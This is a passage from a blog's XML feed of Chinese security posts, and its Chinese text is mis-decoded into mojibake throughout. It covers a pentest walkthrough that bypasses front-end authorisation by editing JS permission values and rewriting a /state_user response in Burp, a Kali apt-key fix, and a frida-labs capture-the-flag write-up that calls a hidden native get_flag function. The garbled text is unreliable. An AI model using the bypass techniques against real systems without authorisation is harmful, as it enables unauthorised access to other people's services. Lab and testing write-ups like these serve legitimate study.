src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812163.png" alt="img"> </p><p>è¿›å…¥ä¸‹ä¸€æ®µï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812095.png" alt="img"> </p><p>åŒæ ·åœ°ï¼Œå†æ§åˆ¶å°å¯¹å…¶èµ‹å€¼ä¸º1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221812081.png" alt="img"> </p><p>å†å¾€ä¸‹èµ°ï¼Œæ­¤æ—¶ä¼šè·³è½¬åˆ°ä¸€ä¸ªcontracté¡µé¢</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813046.png" alt="img"> </p><p>è™½ç„¶æ²¡è¿›å…¥homeé¡µé¢ï¼Œä½†æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°±æ¥åˆ°äº†ä¸€ä¸ªåŸæœ¬æ— æ³•ç›´æ¥è®¿é—®åˆ°çš„ä¸€ä¸ªå‰ç«¯uriï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨å®ƒçš„åŠŸèƒ½äº†ï¼Œçœ‹è¿™ä¸ªé¡µé¢è¦å¡«çš„ä¸œè¥¿å¾ˆå¤šï¼Œæœ€åçš„ä¼ å‚è‚¯å®šå·¨å¤æ‚ï¼Œå°±ç®—å¼€å‘å¥½å¿ƒå‘Šè¯‰ä½ ç¼ºäº†ä»€ä¹ˆå‚æ•°ï¼Œä½ æ•²éƒ½è¦æ•²åŠå¤©ï¼Œç”¨è¿™ç§æ–¹æ³•æµ‹èµ·æ¥å°±å¿«å¤šäº†ã€‚</p><p>å½“ç„¶ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¿›å…¥homeé¡µé¢ï¼Œé‡å®šå‘åˆ°è¿™ä¸ªå®Œå–„è´¦å·ä¿¡æ¯çš„é¡µé¢ï¼Œè¯´æ˜è¿˜æ˜¯æœ‰å“ªé‡Œçš„é‰´æƒæ²¡æå¥½ï¼Œæˆ‘ä»¬å†å›åˆ°åˆšåˆšçš„é‰´æƒé€»è¾‘éƒ¨åˆ†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813747.png" alt="img"> </p><p>å¯ä»¥å‘ç°ï¼Œåç»­å…¶å®è¿˜å¯¹o.state.account.permissionçš„å€¼åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå€¼ä¸º1ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¿›å…¥contracté¡µé¢ã€‚å€¼åªè¦æ˜¯å¤§äº1çš„æ•´æ•°ï¼Œå…¶å®éƒ½å¯ä»¥è®¿é—®åˆ°homeé¡µé¢</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813726.png" alt="img"> </p><p>å› æ­¤åœ¨æ§åˆ¶å°å°†permissionæ”¹ä¸º3</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813388.png" alt="img"> </p><p>å†è®¿é—®homeï¼ŒæˆåŠŸï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813515.png" alt="img"> </p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„æµ‹è¯•åå°çš„å„ç§åŠŸèƒ½ç‚¹äº†ã€‚å½“ç„¶ä¸Šè¿°æ“ä½œå¯¹ä¸æ‡‚JSå’Œå‰ç«¯è°ƒè¯•çš„å¸ˆå‚…è‚¯å®šä¹Ÿä¸å¤ªå‹å¥½ã€‚å®é™…ä¸Šä¸Šè¿°æ“ä½œå’Œå¹³æ—¶æµ‹è¯•ä¸šåŠ¡é€»è¾‘æ¼æ´ä¸­çš„â€œä¿®æ”¹è¿”å›åŒ…â€æ“ä½œæ˜¯æœ‰ç­‰ä»·å…³ç³»çš„ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬é‡æ–°è®¿é—®ä¸€ä¸‹homeé¡µé¢ï¼Œç„¶ååœ¨burpæŠ“åŒ…ï¼Œæ‹¦æˆªä¸€ä¸‹è¿”å›åŒ…ã€‚</p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ª&#x2F;state_userçš„åç«¯æ¥å£ï¼Œä»è¿™ä¸ªæ¥å£çš„åå­—æˆ‘ä»¬å…¶å®å°±çŸ¥é“ï¼Œå®ƒæ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªç”¨æˆ·çŠ¶æ€çš„ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813184.png" alt="img"> </p><p>ç„¶åä½ å†æ³¨æ„è¿™é‡Œçš„account_stateï¼Œé»˜è®¤æ˜¯0ã€‚ä»¥åŠè¿™ä¸ªis_loginï¼Œé»˜è®¤æ˜¯falseã€‚ä»–ä»¬æ˜¯ä¸æ˜¯å°±ç‰¹åˆ«åƒæˆ‘ä»¬åˆšåˆšåœ¨JSé‡Œåˆ†æå‡ºæ¥çš„o.state.account.permissionå’Œo.state.baseInfo.isLoginï¼Ÿæˆ‘ä»¬æ¨æµ‹è¿™ä¸ªå‰ç«¯å®é™…ä¸Šå°±æ˜¯ä»è¿”å›åŒ…é‡Œæ‹¿åˆ°account_stateå’Œis_loginï¼Œå¹¶åˆ†åˆ«ç»™o.state.account.permissionã€o.state.baseInfo.isLoginèµ‹å€¼çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬å°†å…¶åˆ†åˆ«æ”¹ä¸º3å’Œtrueï¼Œç„¶åæŠŠå¦ä¸€ä¸ªcodeæ”¹ä¸º200ï¼Œå‘åŒ…</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221813645.png" alt="img"> </p><p>è¿˜æ˜¯èƒ½çœ‹åˆ°åå°é¡µé¢ã€‚è¿™æ ·è™½ç„¶æ“ä½œèµ·æ¥æ¯”è¾ƒç®€å•å‹å¥½ï¼Œä½†æ˜¯ä¸‡ä¸€ç›®æ ‡å‰ç«¯å¯¹å“åº”ç»“æœçš„åˆ¤æ–­è®¾ç½®çš„æ¯”è¾ƒå¤æ‚ï¼Œé‚£å°±ä¸æ˜¯é‚£ä¹ˆå¥½åŠäº†ï¼Œæ¯”å¦‚æˆ‘å‰ç«¯åˆ¤æ–­permissionä¸ºtest123abcdefæ‰ä¸ºæœ‰æ•ˆï¼Œæˆ‘ä»¬å¸¸è§çš„æ”¹å“åº”åŒ…çš„æ–¹æ³•å°±å¾ˆéš¾æ”¹æˆè¿™æ ·äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯å›åˆ°JSå»åˆ†æè°ƒè¯•æ‰èƒ½åº”å¯¹å¤§éƒ¨åˆ†å¥‡è‘©æƒ…å†µï¼Œè¿˜æ˜¯æ¯”è¾ƒåƒåŸºæœ¬åŠŸçš„ã€‚</p><h2 id="0x11-å…³äºå‚æ•°å€¼"><a href="#0x11-å…³äºå‚æ•°å€¼" class="headerlink" title="0x11 å…³äºå‚æ•°å€¼"></a>0x11 å…³äºå‚æ•°å€¼</h2><p>ä¸Šé¢æˆ‘ä»¬æ‰¾åˆ°äº†æ¥å£ï¼Œæ‰¾åˆ°äº†å‚æ•°åï¼Œç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹å°±å¯ä»¥ç›´æ¥å¼€å§‹æµ‹è¯•äº†ï¼Œä½†æœ‰äº›æ—¶å€™æˆ‘ä»¬å¯èƒ½è¿˜ä¼šé¢ä¸´ä¸€äº›å…³äºå‚æ•°å€¼çš„FUZZé—®é¢˜ï¼Œä½†æ˜¯åˆ°è¿™é‡Œå°±å¾ˆç®€å•äº†ã€‚è¿™éƒ¨åˆ†é—®é¢˜å¤§å¤šæ•°æƒ…å†µä¸‹é›†ä¸­äºjsonä¼ å‚çš„æƒ…å†µï¼Œjsonä¼ å‚é‡Œå¸¸è§çš„ç±»å‹å…¶å®ä¹Ÿå°±æ˜¯ä¸‹å›¾è¿™äº›</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409221814663.png" alt="img"> </p><p>aä¸ºæ•´å‹ï¼Œbä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œcä¸ºå¸ƒå°”ç±»å‹ï¼Œdä¸ºæ•°ç»„ç±»å‹ï¼Œeä¸ºå¯¹è±¡ç±»å‹ã€‚è¿™å‡ ç§ç±»å‹éƒ½è¯•ä¸€ä¸‹å‡†æ²¡é”™ï¼Œè€Œä¸”å¤§å¤šæ•°æƒ…å†µä¸‹ç±»å‹é”™äº†åç«¯æ˜¯è¦ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¿¡æ¯çš„ï¼Œä»å¼‚å¸¸ä¿¡æ¯é‡Œå°±å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¿™ä¸ªåœ°æ–¹è¦ä¼ å…¥ä»€ä¹ˆç±»å‹ï¼Œæ¯”å¦‚å¼‚å¸¸é‡Œçœ‹åˆ°xxxxx Object xxxxxxï¼Œå°±å¯ä»¥çŒœæµ‹æŸä¸ªå‚æ•°å¯èƒ½è¦ä¼ å…¥å¯¹è±¡ç±»å‹çš„ä¼ å‚ã€‚</p><p>æ­¤å¤–è¿˜æœ‰ä¸€ç‚¹å’Œä¼ å‚å€¼é™åˆ¶æœ‰å…³çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°ä¸€äº›å­—ç¬¦ä¸²æ ¼å¼åŒ–é—®é¢˜ã€‚æ¯”æ–¹è¯´ä¸€ä¸ª</p><p>Date&#x3D;</p><p>çœ‹åˆ°è¿™æ ·çš„å‚æ•°åï¼Œç„¶åå‘ç°è‡ªå·±å‚æ•°å€¼æ€ä¹ˆæµ‹éƒ½æµ‹ä¸å¯¹çš„è¯ï¼Œå¯èƒ½æ˜¯åç«¯å¯¹è¿™é‡Œä¼ å…¥çš„å­—ç¬¦ä¸²åšäº†æ—¥æœŸç±»å‹çš„æ ¼å¼åŒ–ã€ç±»å‹é™åˆ¶æˆ–æ­£åˆ™åŒ¹é…ï¼Œè¿™æ—¶å€™å¯ä»¥è€ƒè™‘ä¼ å…¥2024-09-07 12:00:00è¿™æ ·ç¬¦åˆæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚è¿˜æœ‰äº›å¯èƒ½å‡ºç°è¿™ç§é—®é¢˜çš„å‚æ•°ï¼Œä¸€èˆ¬éƒ½å’Œèº«ä»½è¯ã€æ‰‹æœºå·ã€é‚®ç®±ç­‰ä¸ªäººä¿¡æ¯æœ‰å…³ã€‚ä¸æ’é™¤å¼€å‘è€…è‡ªå·±è®¾å®šäº†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„å­—ç¬¦ä¸²æ ¼å¼ï¼Œè¿™äº›å°±å¾—å…·ä½“æƒ…å†µå…·ä½“åˆ†æäº†ã€‚</p><h2 id="0x12-ç»“è¯­"><a href="#0x12-ç»“è¯­" class="headerlink" title="0x12 ç»“è¯­"></a>0x12 ç»“è¯­</h2><p>åœ¨æ—¥å¸¸æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯èƒ½å­˜åœ¨æœªé‰´æƒé—®é¢˜çš„æ¥å£ï¼Œä½†æ‰¾ä¸åˆ°å¯¹åº”çš„å‚æ•°ï¼Œç¡®å®æ˜¯ä¸ªå¾ˆä»¤äººçº¢æ¸©çš„é—®é¢˜ï¼Œå¸Œæœ›è¿™ç¯‡åˆ†äº«èƒ½å¸®åŠ©å¸ˆå‚…ä»¬æ‰¾åˆ°å‚æ•°ï¼Œå¯èƒ½æœ‰ä¸€äº›æ²¡æœ‰æåˆ°ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬è¡¥å……ã€‚æœ¬ç³»åˆ—ç›®å‰å·²ç»åˆ†æäº†æ”»å‡»è€…å¯ä»¥ä»JSä¸­æå–å“ªäº›ä¿¡æ¯ï¼Œåˆ†æäº†åº”è¯¥å¦‚ä½•æå–å‚æ•°åå‚æ•°å€¼ä»¥è¾…åŠ©æ¥å£æµ‹è¯•ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„é—®é¢˜æ²¡æœ‰è§£å†³â€”â€”åœ¨ä¸åŒåœºæ™¯ä¸‹æ”»å‡»è€…åº”è¯¥å¦‚ä½•è·å–JSã€‚å› æ­¤åç»­å‡ ç¯‡æ–‡ç« ä¼šä»‹ç»ä¸åŒåœºæ™¯ä¸‹è·å–JSçš„æ–¹æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‚æ•°æå– </tag>
            
            <tag> fuzz </tag>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é—®é¢˜è§£å†³-kali linuxå‡ºç°ä¸‹åˆ—ç­¾åæ— æ•ˆï¼š EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository ï¼œdevel@kali.orgï¼</title>
      <link href="/2024/09/20/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3-kali%20linux%E5%87%BA%E7%8E%B0%E4%B8%8B%E5%88%97%E7%AD%BE%E5%90%8D%E6%97%A0%E6%95%88%EF%BC%9A%20EXPKEYSIG%20ED444FF07D8D0BF6%20Kali%20Linux%20Repository%20%EF%BC%9Cdevel@kali.org%EF%BC%9E/"/>
      <url>/2024/09/20/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3-kali%20linux%E5%87%BA%E7%8E%B0%E4%B8%8B%E5%88%97%E7%AD%BE%E5%90%8D%E6%97%A0%E6%95%88%EF%BC%9A%20EXPKEYSIG%20ED444FF07D8D0BF6%20Kali%20Linux%20Repository%20%EF%BC%9Cdevel@kali.org%EF%BC%9E/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>1ã€ä½¿ç”¨kaliå®‰è£…è½¯ä»¶çš„æ—¶å€™æŠ¥é”™ï¼Œä¸”å®‰è£…å¤±è´¥ï¼Œæ‰¾ä¸åˆ°å®‰è£…åŒ…</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201056801.png" alt="image.png"> </p><p>2ã€èµ·åˆä»¥ä¸ºæ˜¯å®‰è£…æºçš„é—®é¢˜ï¼Œæ›´æ”¹å®‰è£…æºåï¼Œ<code>apt-install update</code>æ›´æ–°æºï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201056832.png" alt="image.png"> </p><p>3ã€è§£å†³åŠæ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget archive.kali.org/archive-key.asc   //ä¸‹è½½ç­¾å</span><br><span class="line">apt-key add archive-key.asc   //å®‰è£…ç­¾å</span><br></pre></td></tr></table></figure><p>é‡æ–°æ›´æ–°å®‰è£…æºï¼Œæ²¡æœ‰å†æŠ¥é”™äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201057303.png" alt="image.png"> </p><p>4ã€å°è¯•å®‰è£…è½¯ä»¶ï¼Œä¹Ÿä¸å†æœ‰æŠ¥é”™ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202409/202409201057229.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é—®é¢˜è§£å†³ </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(3)</title>
      <link href="/2024/07/27/frida-labs(3)/"/>
      <url>/2024/07/27/frida-labs(3)/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="challenge-0x0A"><a href="#challenge-0x0A" class="headerlink" title="challenge 0x0A"></a>challenge 0x0A</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281611808.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281611170.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activityMainBinding.sampleText.setText(stringFromJNI());</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612397.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flag</span><br><span class="line">Java_com_ad2001_frida0xa_MainActivity_stringFromJNI</span><br></pre></td></tr></table></figure><p>åœ¨Javaå±‚ä¸­å¼•ç”¨äº† <code>stringFromJNI</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°ä½œç”¨å°±æ˜¯è®¾ç½®äº†æ–‡æœ¬â€œHello Hackersâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612826.png" alt="image.png"> </p><p>ç»§ç»­å†çœ‹<code>get_flag</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ²¡æœ‰åœ¨JAVAå±‚ä¸­å£°æ˜ï¼Œä¹Ÿæ²¡æœ‰åœ¨åº“ä¸­å¼•ç”¨ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281612978.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281613262.png" alt="image.png"> </p><p>æ¥ä¸‹æ¥ï¼Œçœ‹ä»–çš„åç¼–è¯‘ï¼š</p><p>è¯¥å‡½æ•°æ¥å—ä¸¤ä¸ªæ•´æ•°å€¼ï¼Œå°†å®ƒä»¬ç›¸åŠ ï¼Œç„¶åæ£€æŸ¥ç»“æœæ˜¯å¦ç­‰äº 3ã€‚å¦‚æœç­‰äº 3ï¼Œåˆ™å­˜åœ¨å¾ªç¯ã€‚å®ƒå¯¹ç¡¬ç¼–ç å­—ç¬¦ä¸² <code>FPE&gt;9q8A&gt;BK-)20A-#Y</code> è¿›è¡Œè§£ç å¹¶è®°å½•è§£ç åçš„flagã€‚å› æ­¤ï¼Œè¦è·å–flagï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨æ­¤æ–¹æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281623554.png" alt="image.png"> </p><p>æ‰€ä»¥ï¼Œè¿™å—ä½¿ç”¨fridaç›´æ¥è°ƒç”¨<code>get_flag</code>å‡½æ•°</p><p>1ã€ä¸‹é¢æ˜¯ä¸€ä¸ªå‚è€ƒæ¨¡æ¿</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);</span><br><span class="line">const native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);</span><br><span class="line">native_function(&lt;arguments&gt;);</span><br></pre></td></tr></table></figure><p>é€è¡Œè§£é‡Šä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var native_adr = new NativePointer(&lt;address_of_the_native_function&gt;);</span><br></pre></td></tr></table></figure><p>è¦åœ¨ frida ä¸­è°ƒç”¨æœ¬æœºå‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª <code>NativePointer</code> å¯¹è±¡ã€‚æˆ‘ä»¬åº”è¯¥å°†è¦è°ƒç”¨çš„æœ¬æœºå‡½æ•°çš„åœ°å€ä¼ é€’ç»™ NativePointer æ„é€ å‡½æ•°ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ›å»º <code>NativeFunction</code> å¯¹è±¡ï¼Œå®ƒä»£è¡¨æˆ‘ä»¬è¦è°ƒç”¨çš„å®é™…æœ¬æœºå‡½æ•°ã€‚å®ƒå›´ç»•æœ¬æœºå‡½æ•°åˆ›å»ºä¸€ä¸ª JavaScript åŒ…è£…å™¨ï¼Œå…è®¸æˆ‘ä»¬ä» frida è°ƒç”¨è¯¥æœ¬æœºå‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const native_function = new NativeFunction(native_adr, &#x27;&lt;return type&gt;&#x27;, [&#x27;argument_data_type&#x27;]);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥æ˜¯ <code>NativePointer</code> å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æœ¬æœºå‡½æ•°çš„è¿”å›ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦ä¼ é€’ç»™æœ¬æœºå‡½æ•°çš„å‚æ•°çš„æ•°æ®ç±»å‹åˆ—è¡¨ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥åƒåœ¨ java ç©ºé—´ä¸­ä¸€æ ·è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">native_function(&lt;arguments&gt;);</span><br></pre></td></tr></table></figure><p>åé¢ç›´æ¥è°ƒç”¨å³å¯ã€‚</p><p>2ã€ç¼–å†™è„šæœ¬è°ƒç”¨</p><p>â‘ è·å–å‡½æ•°çš„åœ°å€ï¼Œè¿™å—ä½¿ç”¨åŸºå€+åç§»çš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.ad2001.frida0xa ]-&gt; Module.getBaseAddress(&quot;libfrida0xa.so&quot;)</span><br><span class="line">&quot;0xc1859000&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281625260.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281625554.png" alt="image.png"> </p><p>So the offset &#x3D; <code>0x00028bb0</code> - <code>0x00010000</code> &#x3D; <code>0x18BB0</code>. Now we can add that to the base.</p><p>ç°åœ¨å°±è·å–åˆ°äº†å‡½æ•°çš„åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var adr = Module.findBaseAddress(&quot;libfrida0xa.so&quot;).add(0x18BB0)</span><br></pre></td></tr></table></figure><p>â‘¡è°ƒç”¨å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x18BB0</span>) <span class="comment">// Address of the get_flag() function</span></span><br><span class="line"><span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(adr);</span><br><span class="line"><span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>éœ€è¦å‚æ•°çš„æ€»å’Œç­‰äº <code>3</code> æ‰èƒ½é€šè¿‡ <code>if</code> æ£€æŸ¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ é€’ <code>1</code> å’Œ <code>2</code> ä½œä¸ºå‚æ•°å¹¶è°ƒç”¨è¯¥æ–¹æ³•ã€‚æ‰€ä»¥æœ€ç»ˆçš„è„šæœ¬ä¼šæ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> adr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x18BB0</span>) <span class="comment">// Address of the get_flag() function</span></span><br><span class="line"><span class="keyword">var</span> get_flag_ptr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(adr);</span><br><span class="line"><span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(get_flag_ptr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"><span class="title function_">get_flag</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281626480.png" alt="img"> </p><p>ä¸‹é¢æ£€æŸ¥ä¸€ä¸‹æ—¥å¿—è¾“å‡ºï¼š</p><p>ä½¿ç”¨ <code>adb logcat</code>ç›‘å¬ä¸€ä¸‹æ—¥å¿—è¾“å‡º</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281626531.png" alt="img"> </p><p>è¿™å—å¯ä»¥hook <code>_android_log_print</code>è¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œæ‰“å°å®ƒçš„æœ€åä¸€ä¸ªå‚æ•°ä¹Ÿå¯ä»¥ï¼</p><h1 id="challenge-0x0B"><a href="#challenge-0x0B" class="headerlink" title="challenge 0x0B"></a>challenge 0x0B</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281629677.png" alt="image.png"> </p><p>å•å‡»è¯¥æŒ‰é’®ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹ï¼Œæ²¡æœ‰ä»€ä¹ˆå‚è€ƒä»·å€¼ã€‚ç›´æ¥ä½¿ç”¨ jadx å§ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630098.png" alt="image.png"> </p><p>åœ¨åç¼–è¯‘å¼€å§‹æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŸç”Ÿå‡½æ•° <code>getFlag()</code> çš„å£°æ˜ã€‚</p><p>åœ¨åº•éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åº”ç”¨ç¨‹åºä½¿ç”¨ <code>System.loadLibrary()</code> åŠ è½½ <code>frida0xb.so</code> ã€‚</p><p>åœ¨ <code>onCreate</code> æ–¹æ³•ä¸­ï¼Œå®ƒè°ƒç”¨æœ¬æœºå‡½æ•°ä¸­çš„ <code>getFlag()</code> æ–¹æ³•ã€‚å®ƒä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œä¹Ÿä¸è¿”å›ä»»ä½•å†…å®¹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630163.png" alt="image.png"> </p><p>æŸ¥çœ‹åç¼–è¯‘åçš„ä»£ç ï¼Œ<code>getFlag()</code>å‡½æ•°ï¼Œå†…å®¹ä¸ºç©ºã€‚è¿™æ˜æ˜¾ä¸ç§‘å­¦ã€‚</p><p>ç»§ç»­æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°æ˜¯æœ‰ä»£ç ç‰‡æ®µçš„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281630818.png" alt="image.png"> </p><p>é¦–å…ˆï¼Œå®ƒå°†å€¼ <code>0xdeadbeef</code> åŠ è½½åˆ°å±€éƒ¨å˜é‡ <code>local_14</code> ä¸­ï¼Œç„¶åå°†å…¶ä¸ <code>0x539</code> è¿›è¡Œæ¯”è¾ƒã€‚æˆ‘ä»¬çŸ¥é“ä»–ä»¬ä¸ç›¸ç­‰ã€‚ä»…å½“æ»¡è¶³æ­¤æ¡ä»¶æ—¶æ‰ä¼šæ‰§è¡Œä¸‹é¢çš„ä»£ç å—ã€‚å› æ­¤ï¼Œghidra ä¼˜åŒ–äº†å…¶åç¼–è¯‘ï¼Œå› ä¸ºè¿™ç§æ¯”è¾ƒæ°¸è¿œä¸ä¼šæˆç«‹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å›¾è¡¨é€‰é¡¹è·å¾—æ›´å¥½çš„æƒ³æ³•ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632102.png" alt="image.png"> </p><p>å› æ­¤ï¼Œä¸ºäº†è·å¾—åç¼–è¯‘ï¼Œæˆ‘ä»¬å¯ä»¥ç¦ç”¨ ghidra ä¸­çš„ä¼˜åŒ–ã€‚è½¬åˆ° <code>Edit</code> é€‰é¡¹ -&gt; <code>Tools Options</code> ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632205.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632786.png" alt="image.png"> </p><p>ç‚¹å‡»ç¡®è®¤åï¼Œåç¼–è¯‘çš„ä»£ç å¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281632195.png" alt="image.png"> </p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•è·å¾—flagå‘¢ï¼Ÿ</p><p>å¯ä»¥çœ‹åˆ°è¿™å—çš„<code>if</code>å¾ªç¯ï¼Œå½“åˆ¤æ–­ä¸º<code>false</code>çš„æ—¶å€™ï¼Œæ‰ä¼šå‘ä¸‹æ‰§è¡Œä»£ç ã€‚</p><p>å•å‡»æŒ‰é’®æ—¶å°†è°ƒç”¨è¯¥å‡½æ•°ã€‚ä½†ç”±äº <code>if</code> æ£€æŸ¥æ°¸è¿œä¸ä¼šä¸ºçœŸï¼Œå› æ­¤æˆ‘ä»¬ä¸ä¼šå¾—åˆ°è¯¥æ 